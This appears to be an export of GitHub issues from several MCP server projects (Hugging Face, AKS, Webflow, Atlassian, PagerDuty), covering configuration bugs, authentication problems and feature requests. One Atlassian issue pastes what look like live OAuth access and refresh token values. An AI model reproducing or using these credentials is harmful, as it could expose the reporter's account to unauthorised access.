The `docker:build`, etc scripts don't exists at least not in the root package

This: `docker build -t hf-mcp-server .`, I get the following errors:

![Image](https://github.com/user-attachments/assets/2827ee3e-e1c4-4467-8e30-9db9f789f5eb)

Should specify which is the default mode in the README. Also this section:

```sh
# Run with default settings (SSE transport)
npm run docker:run
```

Implies that the default mode is SSE but when I launched `./start.sh` it it defaults to stdio:

```sh
# Default to stdio transport if not specified
TRANSPORT_TYPE=""${TRANSPORT_TYPE:-stdio}""
```

The `start` command, default mcp mode is streamableHttp:

https://github.com/evalstate/hf-mcp-server/blob/a1f377ae94277f376d35fa2ce2db70dab3d6d584/packages/app/package.json#L17-L20

So basically, in the README the default mode is SSE, in the docker file it's Stdio, and in the pnpm command it's StreamableHttp.

- no mention of `pnpm` in the readme, while it's the package manager used
- `pnpm install && pnpm -r dev` should be enough to launch, when I do that and go on http://localhost:3000 I get a 404
- I need to manually enable adminstration tools here: https://evalstate-hf-mcp-server.hf.space/ btw the name ""administration tool"" makes me think it's an admin stuff, it's just a user managing their repos
	- I don't think there's a need to split search & management
	- we can add whoami endpoint so the user can find own repos easily, it's a mix between search & management
	- management should be enabled by default
	- should be configurable by command line args or by an env file / etc (currently no persistence and not everything enabled by default)
	- maybe everything should just always be enabled to simplify stuff for now

- an example config to use the MCP in cursor or vscode (with custom HF token specified in the cursor/VSCode config) would be nice, and a screenshot of a chat conversation using it too
- no need to `pnpm --filter @hf-mcp/mcp`, can just do `pnpm --filter mcp` (same with `app`)
- can use `-r` instead of `--recursive`, 
- top level commands are maybe not needed, eg you can just say `pnpm -r build` in the README.
- The start top-level command builds (not sure we should do that as part of `start`) and then uses `cd` instead of just `pnpm --filter app start`"

## Issues
There are two high level issues being discussed here:
1. Duplicated `run -i --rm` arguments in the `mcp.json` that comes with the AKS MCP Server installed from VSCode Extensions.
2. Unrecognized `-e` argument in the `mcp.json` that comes with the AKS MCP Server installed from VSCode Extensions, which is a parameter that the `aks-mcp` executable does not recognize.

## Environment Details

I am running Ubuntu 24.04 LTS natively on my machine (not through WSL, but directly on the machine).

```bash
johnsonshi@js-laptop-01 ~ $ cat /etc/os-release
PRETTY_NAME=""Ubuntu 24.04.3 LTS""
NAME=""Ubuntu""
VERSION_ID=""24.04""
VERSION=""24.04.3 LTS (Noble Numbat)""
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
```

I am running this version of VSCode, which is from the latest stable Ubuntu 24.04 Noble deb package in `https://packages.microsoft.com/repos/code stable InRelease`

```bash
johnsonshi@js-laptop-01 ~ $ code --version

```

Docker Desktop is running fine on my Ubuntu 24.04 computer and is running fine (can perform `docker pull`, `docker run`, and a bunch of other `docker` commands).

## Steps to Reproduce Issue 1 - Duplicated Arguments

Open VSCode and go to the VSCode Extensions pane to search for the AKS MCP Server, which is installable as a VSCode Extension. Hit install.

Inspect the `mcp.json`. You will see that there are is a flag `run -i --rm` that is duplicated twice:

```json

When the MCP Server is started, there will be an error due to the duplicated flag:

## Steps to Reproduce Issue 2 - Invalid Argument

After the AKS MCP Server starts up and invokes the `docker ...` command, it will begin pulling images, after which it will run the `ghcr.io/azure/aks-mcp:latest` image and pass in the arguments and run the MCP server.

However, the `-e` flag that comes packaged with the `mcp.json` configuration in the AKS MCP Server VSCode Extension is not recognized:

## Notes

When I uninstall the AKS MCP Server (via the VSCode Extension) and reinstall (via the VSCode Extension as well), the invalid flags are back. As such, this rules out the possibility that invalid flags are caused by my local VSCode editor cache or something like that. The invalid flags are definitely being populated during the VSCode Extension install.

We would like to integrate AKS CVE related data into AKS MCP to provide up-to-date CVE information to the AKS user. We propose to add the following MCP tools:

- `az_aks_cve_get_security_bulletins`: Get comprehensive AKS security bulletins and CVE advisories
- `az_aks_cve_get_active_versions`: Get currently supported AKS, VHD, and K8S release versions
- `az_aks_get_cve_status_by_component`:  Get CVE status and impact analysis for specific components across release categories

The data will be retrieved from public data endpoint: `https://cve-api.prod-aks.azure.com/` (AKS CVE API, [sample data](https://cve-api.prod-aks.azure.com/api/v1/aks-releases/v20250829/scan-reports)) and `https://releases.aks.azure.com/` (release tracker).

We aim to use the above tools allow user to query about live CVEs and mitigation status from their AKS clusters, example scenarios:

- list AKS managed addons impacted by CVE X
- tell me how to mitigate CVE Y in my cluster (using `az_aks_get_cve_status_by_component`)
- tell me about the impact of nginx ingress CVE `CVE-2025-1098` (using `az_aks_cve_get_security_bulletins`)
- ...

We will also provide sample prompts to help the user troubleshoot / investigate usages around the vulneriabilities in their AKS clusters. @feiskyer  / @julia-yin do you have any objections / concerns for us to implement above tools?

Azure/aks-mcp,3383230585,199,Add Hubble Support to AKS MCP Additional Tools,closed,2025-09-04T11:01:21Z,2025-09-05T02:14:56Z,[],SRodi,"# Request: Add Hubble Support to AKS MCP Additional Tools

## Summary

The AKS MCP server currently supports `helm` and `cilium` as additional tools, but does not expose `hubble` support despite the underlying `mcp-kubernetes` dependency already supporting it. This limits network observability capabilities for AKS clusters using Cilium with Hubble enabled.

## Current Behavior

**AKS MCP v0.0.7:**

```bash
$ aks-mcp --help
--additional-tools string   Comma-separated list of additional Kubernetes tools to support (kubectl is always enabled). Available: helm,cilium
```

**MCP Kubernetes v0.0.9:**

```bash
$ mcp-kubernetes --help  
--additional-tools string   Comma-separated list of additional tools to support (kubectl is always enabled). Available: helm,cilium,hubble
```

## Expected Behavior

AKS MCP should expose Hubble support since it's already available in the underlying mcp-kubernetes dependency:

```bash
$ aks-mcp --help
--additional-tools string   Comma-separated list of additional Kubernetes tools to support (kubectl is always enabled). Available: helm,cilium,hubble
```

## Use Case

Hubble provides deep network visibility for Kubernetes clusters using eBPF and is essential for:

- **Network Policy Troubleshooting**: Debug connectivity issues with network policies
- **Service Map Visualization**: Understand service-to-service communication patterns  
- **Flow Monitoring**: Real-time network flow inspection and analysis
- **DNS Resolution Tracking**: Monitor DNS queries and resolution patterns
- **Security Event Monitoring**: Detect and analyze network security events
- **Performance Analysis**: Identify network bottlenecks and latency issues

Many AKS clusters use Cilium with Hubble enabled for advanced network observability, and AKS MCP users need access to these capabilities through the MCP interface.

## Technical Context

### Current Dependency Version

The `go.mod` shows AKS MCP is using mcp-kubernetes v0.0.9:

```go
github.com/Azure/mcp-kubernetes v0.0.9
```

### Verification

The mcp-kubernetes v0.0.9 binary confirms Hubble support:

```bash
$ curl -L https://github.com/Azure/mcp-kubernetes/releases/latest/download/mcp-kubernetes-linux-amd64 -o mcp-k8s
$ chmod +x mcp-k8s && ./mcp-k8s --help
--additional-tools string   Comma-separated list of additional tools to support (kubectl is always enabled). Available: helm,cilium,hubble
```

### Integration Point

The `internal/k8s/adapter.go` file shows AKS MCP uses the mcp-kubernetes library through adapter functions, so Hubble support should be straightforward to expose.

## Testing Scenarios

When implemented, the following should work:

```bash
# Enable Hubble tools
$ aks-mcp --additional-tools hubble

# Enable all observability tools  
$ aks-mcp --additional-tools kubectl,helm,cilium,hubble

# Verify Hubble tools are available
$ # Should show hubble-related MCP functions in the tool list
```

Azure/aks-mcp,3358162120,190,"README: ambiguous WSL guidance - using ""wsl"" in mcp.json can break Remote-WSL (ENOENT)",closed,2025-08-27T06:26:55Z,2025-08-29T05:26:01Z,[],torumakabe,"Summary: The README currently suggests setting ""command"": ""wsl"" for VS Code running inside WSL. This is ambiguous and can be misleading. When VS Code is opened inside WSL (Remote - WSL), using ""wsl"" in mcp.json will generally not work: ""wsl"" is a Windows-side launcher and is not available/meaningful from inside the WSL extension host, which leads to spawn/ENOENT errors and MCP startup failure.

Steps to reproduce:

1. Open VS Code inside a WSL distro (Remote - WSL).
2. Add a user-level mcp.json entry that uses ""command"": ""wsl"" and args pointing to a WSL path (e.g., ""/home/you/.vs-kubernetes/tools/aks-mcp/aks-mcp"").
3. Start the MCP server. The server fails to spawn and logs errors like ""Server exited before responding to initialize request.""

Expected behavior: The README should clearly distinguish the two different contexts and provide correct examples for both:

- Windows host VS Code (extension host on Windows): when invoking a WSL binary from Windows, use ""command"": ""wsl"".
- VS Code running in WSL (Remote - WSL; extension host on Linux): do NOT use ""wsl"". Call the Linux binary directly or use a shell wrapper such as ""bash -c"".

Suggested fix (concise):

- Update the WSL note to explicitly separate the two contexts (Windows host vs Remote-WSL) and give sample configurations for each.
- Add a short Troubleshooting note for ENOENT and recommend checking whether VS Code is running on Windows or inside WSL.

Windows (VS Code on Windows — invoke WSL binary via wsl):

```
{
  ""servers"": {
    ""aks-mcp"": {
      ""type"": ""stdio"",
      ""command"": ""wsl"",
      ""args"": [
        ""--"",
        ""/home/you/.vs-kubernetes/tools/aks-mcp/aks-mcp"",
        ""--transport"",
        ""stdio""
      ]
    }
  }
}
```

WSL (VS Code running inside WSL — call bash or binary directly):

```
{
  ""servers"": {
    ""aks-mcp"": {
      ""type"": ""stdio"",
      ""command"": ""bash"",

2. 404 Response Hint — Update the `/404 Page Not Found` response to return a minimal JSON message explaining that the MCP server expects an `initialize` request to `/mcp` before other calls.

- Add a `gadget_image` parameter alongside the existing config here: https://github.com/Azure/aks-mcp/blob/main/internal/components/inspektorgadget/registry.go#L33
- Enforce that only one of `gadget_image` or `gadget_name` can be specified
- Start/Run gadget respecting the generic Kubernetes filtering (or allow users to [specify custom filtering](https://inspektor-gadget.io/docs/latest/spec/operators/filter))

**Note**: By default, Inspektor Gadget only runs gadgets signed by the Inspektor Gadget team, so only official gadgets will work out of the box. If needed, users can customize their IG installation to allow running additional gadgets.

Azure/aks-mcp,3311029449,147,az_* tools prompt for 'az login' in container despite AZURE_* env vars,closed,2025-08-11T17:46:46Z,2025-08-20T02:40:55Z,[],pauldotyu,"## Issue

In Docker/Kubernetes, `az_*` tools return an error with `Please run 'az login' to setup account.` even when `AZURE_*` env vars (SP secret, Workload Identity, or Managed Identity) are set. Being able to authenticate using `AZURE_*` env vars will be critical to running the MCP cluster in an AKS cluster (or any K8s cluster) with workload identity.

## Repro steps

Log in to Azure CLI

```sh
az login
```

Create an application registration for testing

```sh
AZURE_TENANT_ID=$(az account show --query tenantId -o tsv)
AZURE_SUBSCRIPTION_ID=$(az account show --query id -o tsv)
AZURE_SERVICE_PRINCIPAL=$(az ad sp create-for-rbac -n aks-mcp --role reader --scopes /subscriptions/$AZURE_SUBSCRIPTION_ID --create-password)
AZURE_CLIENT_ID=$(echo $AZURE_SERVICE_PRINCIPAL | jq -r .appId)
AZURE_CLIENT_SECRET=$(echo $AZURE_SERVICE_PRINCIPAL | jq -r .password)
```

Pull and run the container.

```sh
docker pull ghcr.io/azure/aks-mcp:v0.0.5
docker run --rm -p 8000:8000 \
-e AZURE_TENANT_ID=$AZURE_TENANT_ID \
-e AZURE_SUBSCRIPTION_ID=$AZURE_SUBSCRIPTION_ID \
-e AZURE_CLIENT_ID=$AZURE_CLIENT_ID \
-e AZURE_CLIENT_SECRET=$AZURE_CLIENT_SECRET \
ghcr.io/azure/aks-mcp:v0.0.5
```

Open a new terminal and run the MCP inspector tool

```sh
npx @modelcontextprotocol/inspector
```

In the MCP inspector UI, change transport type to **Streamable HTTP** and enter URL **http://localhost:8000/mcp** then press the **Connect** button.

Click **Tools** --> **List Tools** --> **az_aks_operations**. 

In the **operation** field, enter `list` and in the **resource_type** field, enter `cluster` then click the **Run Tool** button.

## Expected

`az_*` tools should authenticate non-interactively using `AZURE_*` environment variables from within the container and return a list of my AKS clusters.

## Actual

Azure CLI invoked by tools is unauthenticated and returns the following error message:

```text
ERROR: Please run 'az login' to setup account.
```

## Potential root cause

Seems that the `az_*` tools invoke Azure CLI, which doesn’t automatically authenticate from `AZURE_*` env vars (unlike the SDK). Without an explicit non-interactive `az` login (SP secret, federated token, or managed identity), the CLI returns the login prompt.

## Proposed fix

Add an automatic Azure CLI login step before any `az` command runs. Drive this from environment variables so it works non-interactively.

In `internal/azcli/executor.go`, probe the login state (az account show) and if not logged in, attempt the following:

1. Probe: az account show --query id -o tsv
1. If not logged in, attempt in order:
    - SP secret: `az login --service-principal -u $AZURE_CLIENT_ID -p $AZURE_CLIENT_SECRET --tenant $AZURE_TENANT_ID`
    - Workload Identity: `az login --service-principal -u $AZURE_CLIENT_ID --tenant $AZURE_TENANT_ID --federated-token $AZURE_FEDERATED_TOKEN_FILE`
    - Managed Identity: `az login --identity -u $AZURE_CLIENT_ID`
1. If `AZURE_SUBSCRIPTION_ID` is set: `az account set --subscription $AZURE_SUBSCRIPTION_ID`
1. Re-probe; if still unauthenticated, surface a clear error.

While using the Webflow API through the MCP server, we encountered an issue with the `pages_update_static_content` function. This function requires a `localeId` parameter that must reference a secondary locale. If the site doesn't have any secondary locales configured, the API returns a 400 Bad Request error, making it impossible to update static content on pages.

**Steps to reproduce**
1. Call the `pages_update_static_content` function on a site without secondary locales
2. Use the primary locale ID in the `localeId` parameter
3. Observe the error: ""Bad Request: Request is malformed: The provided locale must be a secondary locale.""

I would like to report an issue related to the new LLM feature available through Webflow MCP. The new feature allows direct edits within the Webflow environment using language models, which is a fantastic improvement. However, I have noticed that the feature does not currently support the editing of custom code, which greatly limits its applicability in more advanced projects.

Custom code editing, which includes scripts for the head and footer sections of pages, is crucial for site customization and integration with other systems. The ability to edit this code directly within the panel using LLMs would be an extremely useful addition to streamline workflows and increase platform flexibility.

**Suggested Improvement:**

**Desired functionality:** Include the ability to edit custom code (head and footer) directly within the panel using LLMs.

**Expected impact:** Increased customization and workflow efficiency for developers and designers who need to integrate specific code into Webflow without relying on external solutions.

Thank you for your attention, and I am happy to provide further details or discuss possible solutions.

Best regards,

webflow/mcp-server,2971201629,19,Bug: Cannot Update Static Text Content via Webflow API (`pages_update_static_content`),closed,2025-04-04T03:52:35Z,2025-05-13T18:54:07Z,[],thomasto314,"## Summary
I attempted to update an `<h1>` element's static text content using the `pages_update_static_content` endpoint. While updating the page title worked correctly using `pages_update_page_settings`, all attempts to change the actual static content failed due to locale-related validation errors. The API consistently rejects `localeId` values as invalid or missing, even on a single-language site.

---

## Environment

- **Site ID:** `67ee64fe10ac9dc9c5c66c57`
- **Page ID:** `67ee64fe10ac9dc9c5c66c80`
- **Node ID (h1):** `92940503-3d96-3c4c-9825-44f6d56b1393`
- **Locale setup:** Single-language (no explicit locale configuration)
- **Webflow API version:** Latest

---

## Steps to Reproduce

1. Retrieved site list using `sites_list`
2. Retrieved pages using `pages_list`
3. Retrieved page content via `pages_get_content` and identified the `h1` node with ID
4. Attempted to update the text from `Hello, world!` to `Hello from MCP` using `pages_update_static_content`
5. Encountered repeated validation errors related to the `localeId` field

---

## Attempted Payloads & Responses

### ✅ Page Title Update (Success)

```json
{
  ""page_id"": ""67ee64fe10ac9dc9c5c66c80"",
  ""body"": {
    ""id"": ""67ee64fe10ac9dc9c5c66c80"",
    ""title"": ""Hello from MCP""
  }
}
```

✅ Title updated successfully.

---

### ❌ Update Attempt with `""en""` as `localeId`

```json
{
  ""page_id"": ""67ee64fe10ac9dc9c5c66c80"",
  ""nodes"": [
    {
      ""text"": ""<h1>Hello from MCP</h1>"",
      ""nodeId"": ""92940503-3d96-3c4c-9825-44f6d56b1393""
    }
  ],
  ""localeId"": ""en""
}
```

❌ Response:
```json
{
  ""message"": ""Validation Error: [\""Value (localeId) should be an ObjectId\""]"",
  ""code"": ""validation_error""
}
```

---

### ❌ Attempt with Empty `localeId`

```json
""localeId"": """"
```

Same validation error.

---

### ❌ Attempt without `localeId` (Omitted)

```json
// No localeId field included
```

❌ Response:
```json
{
  ""code"": ""invalid_type"",
  ""expected"": ""string"",
  ""received"": ""undefined"",
  ""path"": [""localeId""],
  ""message"": ""Required""
}
```

---

### ❌ Attempt with `""default""` as `localeId`

```json
""localeId"": ""default""
```

❌ Response:
```json
{
  ""message"": ""Validation Error: [\""Value (localeId) should be an ObjectId\""]""
}
```

---

## Additional Attempts

- Looked for `localeId` via `pages_get_metadata` → No localeId field returned
- Looked for default locale in `sites_get` → No locale information available
- Tried publishing with the updated title → Success
- Tried republishing with correct `customDomains` field → Success

---

## Expected Behavior

The `pages_update_static_content` endpoint should:
1. Accept `""default""` or automatically resolve `localeId` on single-language sites
2. Provide a way to retrieve the valid `localeId` for static content updates
3. Document how locales work with this endpoint
4. Return more actionable error messages (e.g., where to look for the right `localeId`)

---

## Questions

1. How can I programmatically retrieve a valid `localeId`?
2. Is there a different or recommended approach for updating static content like `h1`?
3. Can the documentation be clarified to reflect locale requirements even for sites with no multilingual setup?

---

Would love guidance or any examples on how others have successfully used `pages_update_static_content` on single-language Webflow sites."

I have setup the Postman MCP server in my cursor environment, and notice the tool calls fail to look up the right collection.

Feature Request

**What is the feature request?**
Add support for markdown-formatted responses from the Atlassian MCP server to improve LLM consumption and readability.

**What is the use case?**
Currently, the Atlassian MCP server returns large JSON objects for Jira issues, Confluence pages, and search results. These are difficult for LLMs to parse efficiently as they add a significant amount of noise to context windows. 

# What is the proposed solution?
Add a `format` query parameter that allows clients to request responses in markdown format. For example:
- `https://mcp.atlassian.com/v1/sse?format=json` (Current behavior, default for backward compatibility)
- `https://mcp.atlassian.com/v1/sse?format=markdown` (New option for LLM-friendly formatting)

**Additional context**
The markdown format should:
- Format Jira tickets, Confluence pages, and search results into markdown docs
- Maintain all critical data fields (titles, descriptions, statuses, links, etc.)

This would significantly improve the experience for AI agents and LLMs interacting with Atlassian through the MCP server.

**Are you willing to submit a pull request?**
I would be happy to, but this is not a public repository yet.

atlassian/atlassian-mcp-server,3545309057,12,Access Token Expiry Not Triggering Refresh in Atlassian MCP Server,open,2025-10-23T15:44:48Z,2025-10-28T15:26:12Z,[],amirejaz,"
After the access token expires, the Atlassian MCP server fails to refresh it using the `refresh_token`. Instead, it continues to send API requests with the expired `access_token`, resulting in `401 Unauthorized` responses from the upstream service.

### **Current Behavior**

- The server successfully authenticates and receives a valid `access_token` and `refresh_token`.
- Once the access token reaches its expiry (as per the `Expiry` field in the token struct), subsequent API calls return `401 Unauthorized`.
- No refresh request appears to be made using the `refresh_token`.

---

### **Expected Behavior**
When the access token expires, the MCP server should automatically use the `refresh_token` to obtain a new `access_token` and retry the failed request seamlessly.

---

### **Steps to Reproduce**
1. Start the Atlassian MCP server and authenticate successfully.  
2. Allow 1 hour to pass (or force token expiry).  
3. Observe API calls made by the MCP server to Atlassian APIs.  
4. After expiry, responses become `401 Unauthorized`.  
5. No refresh request is observed in logs or network traces.

I'm much prefer to stay on latest versions of Claude Code _and_ use vendor provided MCPs as much as possible.  I don't like the thought of using some kind of MCP proxy given the risk of supply chain attacks.

I’m trying to connect a **custom MCP client** to Atlassian MCP (like how VS Code integrates with it), but authentication keeps failing.

### What I Did

* Implemented the **OAuth 2.0 (3LO) authorization code flow** using Atlassian’s docs.

* Successfully got a valid access token that looks like this (truncated for clarity):

  ```
  eyJraWQiOiJhdXRoLmF0bGFzc2lhbi5jb20tQUNDRVNT...
  ```

* When I use this token to authenticate my custom MCP server requests, the connection fails — MCP doesn’t accept it.

* I also tried replicating the vscode auth process from the **VS Code public client ID** with the same scopes, 
* What i tried
Initiated the PKCE OAuth flow using the public MCP client ID (GyodEDfMog9jeJ2d) and redirect URI (http://localhost:5598/oauth/callback).
Successfully received an access token and refresh token from https://mcp.atlassian.com/v1/token.
Attempted to connect to https://mcp.atlassian.com/v1/sse using the returned access token with the Model Context Protocol SDK.
``` 
{ ""access_token"": ""712020%3A7cb26270-cc09-497d-ba11-ba3256cbb1f0:yL2IIMBf9I0lEG4F:9BRv7pAbBwSGLNEhCvCEwVM3zpQvbzz4"", ""token_type"": ""bearer"", ""expires_in"": 3300, ""refresh_token"": ""712020%3A7cb26270-cc09-497d-ba11-ba3256cbb1f0:yL2IIMBf9I0lEG4F:5PgEa5sWDDDtjIDlGOP8a4qWAU5aHWWQ"" }
```
but that returns `SseError: SSE error: Non-200 status code (401)`. 

### Problem

There’s **no clear way** to make custom or third-party apps connect to Atlassian MCP.
It seems the platform only accepts connections from Atlassian’s own registered clients.

### Request

Can you please clarify:

1. Whether **custom MCP servers or apps** can connect to Atlassian MCP?
2. If yes, what’s the **correct registration or authentication process**?

PagerDuty/pagerduty-mcp-server,3551647073,62,Pagination limit parameter ignored in list operations,open,2025-10-25T03:35:29Z,2025-10-25T03:35:46Z,[],rdgifford,"## Description
When using list operations (list_services, list_incidents, etc.) with a limit parameter, the paginate() function ignores the user's limit and defaults to fetching up to 1000 records. This causes excessive token usage in MCP responses when users request small result sets.

## Expected Behavior
User sets limit=5 → receives 5 records

## Actual Behavior  
User sets limit=5 → receives up to 1000 records

## Impact
- Excessive token usage
- Slow response times for large datasets
- Poor user experience when requesting small result sets

## Root Cause
The paginate() function has a maximum_records parameter but most tool functions don't pass it, causing it to default to MAX_RESULTS (1000).

## Affected Tools
- schedules
- oncalls
- escalation_policies
- teams
- incidents
- services
- event_orchestrations"
PagerDuty/pagerduty-mcp-server,3529112235,56,Bug: team_ids[] parameter not working in list_incidents,open,2025-10-18T19:11:37Z,2025-10-18T19:11:52Z,[],akkinenivijay,"# PagerDuty MCP Server Bug Report

## Bug: `team_ids[]` parameter not working in `list_incidents`

### Summary

The `list_incidents` tool does not correctly filter incidents by team ID. The MCP server sends `teams_ids[]` to the PagerDuty API, but the API expects `team_ids[]` (singular ""team"").

### Expected Behavior

When calling `list_incidents` with:

```json
{
  ""query_model"": {
    ""teams_ids"": [""P0ZYEQW""],
    ""status"": [""triggered"", ""acknowledged""]
  }
}
```

Should return only incidents for team `P0ZYEQW`.

### Actual Behavior

Returns incidents from ALL teams, ignoring the `teams_ids` filter.

### Root Cause

**File:** `pagerduty_mcp/models/incidents.py` line 90

```python
if self.teams_ids:
    params[""teams_ids[]""] = self.teams_ids  # ❌ Wrong parameter name!
```

**Should be:**

```python
if self.teams_ids:
    params[""team_ids[]""] = self.teams_ids  # ✅ Correct parameter name
```

### Reproduction

**Test with MCP (broken):**

```python
result = await mcp_client.call_tool(""list_incidents"", {
    ""query_model"": {
        ""teams_ids"": [""P0ZYEQW""],
        ""status"": [""triggered"", ""acknowledged""],
        ""limit"": 10
    }
})
# Returns incidents from all teams
```

**Test with Direct API (working):**

```python
import httpx

response = httpx.get(
    ""https://api.pagerduty.com/incidents"",
    headers={""Authorization"": f""Token token={api_token}""},
    params={
        ""team_ids[]"": [""P0ZYEQW""],  # Note: singular ""team""
        ""statuses[]"": [""triggered"", ""acknowledged""],
        ""limit"": 10
    }
)
# Returns only incidents for team P0ZYEQW (3 incidents)
```

### Evidence

**PagerDuty API Documentation:**
<https://developer.pagerduty.com/api-reference/9d0b4b12e36f9-list-incidents>

The parameter is documented as `team_ids[]` (singular), not `teams_ids[]` (plural).

**Direct API Test Results:**

- With `team_ids[]`: Returns 3 incidents for team P0ZYEQW ✅
- Without filter: Returns 5 incidents from various teams

### Proposed Fix

**File:** `pagerduty_mcp/models/incidents.py`

```diff
def to_params(self) -> dict[str, Any]:
    params = {}
    if self.status:
        params[""statuses[]""] = self.status
    if self.since:
        params[""since""] = self.since.isoformat()
    if self.until:
        params[""until""] = self.until.isoformat()
    if self.service_ids:
        params[""service_ids[]""] = self.service_ids
    if self.teams_ids:
-       params[""teams_ids[]""] = self.teams_ids
+       params[""team_ids[]""] = self.teams_ids
    if self.user_ids:
        params[""user_ids[]""] = self.user_ids
```

### Impact

- High: Team filtering is a critical feature for organizations with multiple teams
- Users cannot reliably filter incidents to their specific teams
- Workaround: Use direct PagerDuty API calls instead of MCP server

### Environment

- MCP Server: pagerduty-mcp (latest from main branch)
- PagerDuty API: v2
- Tested: 2025-10-18
